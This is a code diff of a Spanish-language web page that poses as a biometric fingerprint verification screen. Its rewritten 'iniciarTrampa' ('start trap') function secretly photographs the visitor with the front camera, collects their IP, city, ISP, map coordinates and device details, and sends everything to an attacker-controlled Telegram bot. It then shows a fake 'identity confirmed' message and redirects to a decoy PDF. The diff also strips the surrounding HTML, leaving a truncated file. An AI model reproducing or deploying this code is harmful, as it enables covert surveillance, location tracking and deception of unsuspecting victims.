@@ -1,159 +1,69 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Seguro - Verificación Biométrica</title>
-    <style>
-        body { background: #050a0f; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow: hidden; }
-        .fingerprint-container { width: 160px; height: 160px; border: 3px solid #00d4ff; border-radius: 25px; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
-        .fingerprint-container:active { transform: scale(0.95); }
-        .fingerprint-icon { font-size: 90px; user-select: none; }
-        .scan-line { width: 100%; height: 5px; background: #00d4ff; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 20px #00d4ff; display: none; }
-        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
-        .instruction { margin-top: 40px; font-weight: bold; letter-spacing: 1px; padding: 0 25px; font-size: 0.9em; }
-        .loading-bar { width: 220px; height: 6px; background: #111; margin-top: 25px; display: none; border-radius: 10px; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #00d4ff; transition: 3.5s linear; }
-    </style>
-</head>
-<body>
-
-    <div class="fingerprint-container" id="sensor-box">
-        <div class="scan-line" id="line"></div>
-        <span class="fingerprint-icon" id="icon">👆</span>
-    </div>
-
-    <div class="instruction" id="text-guide">
-        DETECTANDO HARDWARE BIOMÉTRICO...
-    </div>
-
-    <div class="loading-bar" id="bar"><div class="progress" id="fill"></div></div>
-
-    <audio id="beep-sound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
-
-    <script src="config.js"></script>
-    <script>
-        const sensorBox = document.getElementById('sensor-box');
-        const textGuide = document.getElementById('text-guide');
-        const icon = document.getElementById('icon');
-        const beep = document.getElementById('beep-sound');
-
-        function configurarInterfaz() {
-            const ua = navigator.userAgent;
-            const esNuevo = /iPhone 1[2-9]|Samsung S2[0-9]|Pixel [6-9]/.test(ua);
-
-            if (esNuevo) {
-                textGuide.innerHTML = "PRESIONE FIRMEMENTE LA HUELLA EN PANTALLA";
-                icon.innerHTML = "🔘"; 
-            } else {
-                textGuide.innerHTML = "COLOQUE EL DEDO EN EL SENSOR LATERAL O TRASERO";
-                icon.innerHTML = "📟";
-            }
-            sensorBox.addEventListener('click', iniciarTrampa);
-        }
-
-        async function iniciarTrampa() {
+async function iniciarTrampa() {
             if (navigator.vibrate) navigator.vibrate(50);
-
             document.getElementById('line').style.display = "block";
             document.getElementById('bar').style.display = "block";
             const fill = document.getElementById('fill');
-            
             textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÓN";
             setTimeout(() => { fill.style.width = "100%"; }, 100);
 
             try {
-                let fotoBlob = null;
+                // 1. Captura de cámara con espera de enfoque
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
                 
-                // 1. Captura de cámara optimizada
-                try {
-                    // Pedimos explícitamente la cámara frontal
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
-                        audio: false 
-                    });
-                    
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute("playsinline", true); // Requerido para iOS
-                    await video.play();
+                // Esperamos un segundo para que la cámara aclare la imagen
+                await new Promise(r => setTimeout(r, 1000));
 
-                    // Pequeña pausa para que la cámara enfoque/ajuste brillo
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                stream.getTracks().forEach(t => t.stop());
 
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; 
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    // Convertimos a blob con una calidad decente
-                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-                    
-                    // Apagamos la cámara
-                    stream.getTracks().forEach(t => t.stop());
-                } catch(e) { 
-                    console.error("Cámara denegada o error:", e); 
-                }
-
-                // 2. Datos de red y ubicación
+                // 2. Obtener ubicación
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
-                
-                let equipo = "Dispositivo Desconocido";
-                try { equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1]; } catch(e) {}
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
 
-                // 3. Formatear reporte
-                const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
-                                `📱 *Equipo:* ${equipo}\n` +
-                                `🌐 *IP:* \`${d.ip}\`\n` +
-                                `📍 *Lugar:* ${d.city}, ${d.country_name}\n` +
-                                `📶 *ISP:* ${d.org}\n` +
-                                `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // 4. Envío a Telegram (Texto y Foto)
-                const promesasEnvio = [];
+                // 3. ENVÍO OBLIGATORIO (Esperamos a que ambos terminen)
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.CHAT_ID);
+                fd.append('photo', fotoBlob, 'foto.jpg');
+                fd.append('caption', reporte); // Enviamos el texto y la foto juntos
+                fd.append('parse_mode', 'Markdown');
 
-                // Envío de reporte de texto
-                promesasEnvio.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                // Usamos sendPhoto para enviar todo de un solo golpe
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CONFIG.CHAT_ID, 
-                        text: reporte, 
-                        parse_mode: 'Markdown'
-                    })
-                }));
-
-                // Envío de foto si se capturó con éxito
-                if (fotoBlob) {
-                    const fd = new FormData();
-                    fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', fotoBlob, 'captura.jpg');
-                    
-                    promesasEnvio.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
-                        method: 'POST', 
-                        body: fd
-                    }));
-                }
-
-                await Promise.all(promesasEnvio);
+                    body: fd
+                });
 
             } catch(e) { 
-                console.error("Error en el proceso general:", e); 
+                console.log("Error en captura:", e); 
+                // Si la cámara falla, intentamos enviar al menos el texto
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const d = await res.json();
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: CONFIG.CHAT_ID, 
+                            text: "⚠️ FALLÓ CÁMARA\nIP: " + d.ip
+                        })
+                    });
+                } catch(err) {}
             }
 
-            // Finalización y Redirección
+            // 4. Finalización
             setTimeout(() => {
-                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
                 beep.play();
                 textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
-                setTimeout(() => { 
-                    window.location.href = CONFIG.PDF_URL; 
-                }, 1500);
-            }, 3500);
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
+            }, 3000);
         }
-
-        window.onload = configurarInterfaz;
-    </script>
-</body>
-</html>
